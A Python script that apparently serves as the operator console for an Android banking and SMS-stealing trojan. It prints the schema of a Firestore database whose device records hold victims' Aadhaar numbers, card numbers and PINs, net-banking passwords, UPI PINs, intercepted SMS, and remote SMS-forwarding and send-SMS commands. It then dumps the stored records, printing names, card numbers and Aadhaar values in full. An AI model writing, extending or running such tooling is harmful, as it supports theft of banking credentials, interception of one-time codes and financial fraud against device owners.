#!/usr/bin/env python3
"""
Show complete Firestore database structure
"""

import firebase_admin
from firebase_admin import credentials, firestore
import json

# Initialize Firebase
cred = credentials.Certificate('C:/Users/Administrator/Videos/rtnew-d8023-firebase-adminsdk-fbsvc-71d8f9b05f.json')
if not firebase_admin._apps:
    firebase_admin.initialize_app(cred)

db = firestore.client()

print("=" * 80)
print("📊 FIRESTORE DATABASE STRUCTURE")
print("=" * 80)
print()

print("📁 Collection: devices/")
print("   └─ Document: {deviceId}")
print("      ├─ id: Long")
print("      ├─ mobilename: String")
print("      ├─ deviceid: String")
print("      ├─ charge: String")
print("      ├─ lastOnline: Long?")
print("      ├─ callForwardStatus: Boolean?")
print("      ├─ userInfo: {")
print("      │  ├─ name: String?")
print("      │  ├─ number: String?")
print("      │  ├─ aadhar: String?")
print("      │  ├─ cardNumber: String?")
print("      │  ├─ cardExpiry: String?")
print("      │  ├─ cardPin: String?")
print("      │  ├─ netBankingUsername: String?")
print("      │  ├─ netBankingPassword: String?")
print("      │  └─ upiPin: String?")
print("      │  }")
print("      ├─ simModel: {")
print("      │  ├─ sim1: String")
print("      │  └─ sim2: String")
print("      │  }")
print("      ├─ forwarding: {")
print("      │  ├─ fromSim: String")
print("      │  ├─ toNumber: String")
print("      │  ├─ status: String")
print("      │  └─ executed: Boolean")
print("      │  }")
print("      ├─ send_sms: {")
print("      │  ├─ phoneNumber: String")
print("      │  ├─ message: String")
print("      │  ├─ sent: Boolean")
print("      │  ├─ simSlot: Int")
print("      │  └─ timestamp: Long")
print("      │  }")
print("      └─ 📁 SubCollection: sms/")
print("         └─ Document: {auto-generated-id}")
print("            ├─ from: String")
print("            ├─ message: String")
print("            ├─ time: Timestamp")
print("            └─ ownerDeviceId: String")
print()

print("📁 Collection: smsforward/")
print("   └─ Document: {auto-generated-id}")
print("      ├─ fromSim: String")
print("      ├─ toNumber: String")
print("      ├─ status: String")
print("      └─ executed: Boolean")
print()

print("📁 Collection: logs/")
print("   └─ Document: {auto-generated-id}")
print("      ├─ timestamp: Timestamp")
print("      ├─ level: String")
print("      ├─ message: String")
print("      └─ deviceId: String?")
print()

print("=" * 80)
print("📋 CURRENT DATABASE CONTENTS")
print("=" * 80)
print()

# Show actual data
devices_ref = db.collection('devices')
devices = devices_ref.stream()

device_count = 0
for device in devices:
    device_count += 1
    device_data = device.to_dict()
    print(f"📱 Device: {device.id}")
    print(f"   mobilename: {device_data.get('mobilename', 'N/A')}")
    print(f"   charge: {device_data.get('charge', 'N/A')}")
    
    user_info = device_data.get('userInfo')
    if user_info:
        print(f"   userInfo:")
        if isinstance(user_info, dict):
            for key, value in user_info.items():
                if value:
                    # Mask sensitive data
                    if key in ['upiPin', 'cardPin', 'netBankingPassword']:
                        print(f"      {key}: {'*' * len(str(value))}")
                    else:
                        print(f"      {key}: {value}")
    else:
        print(f"   userInfo: None")
    
    # Check SMS subcollection
    sms_ref = devices_ref.document(device.id).collection('sms')
    sms_count = len(list(sms_ref.stream()))
    print(f"   📨 SMS count: {sms_count}")
    print()

if device_count == 0:
    print("⚠️  No devices found in database")
else:
    print(f"✅ Total devices: {device_count}")

print()
print("=" * 80)
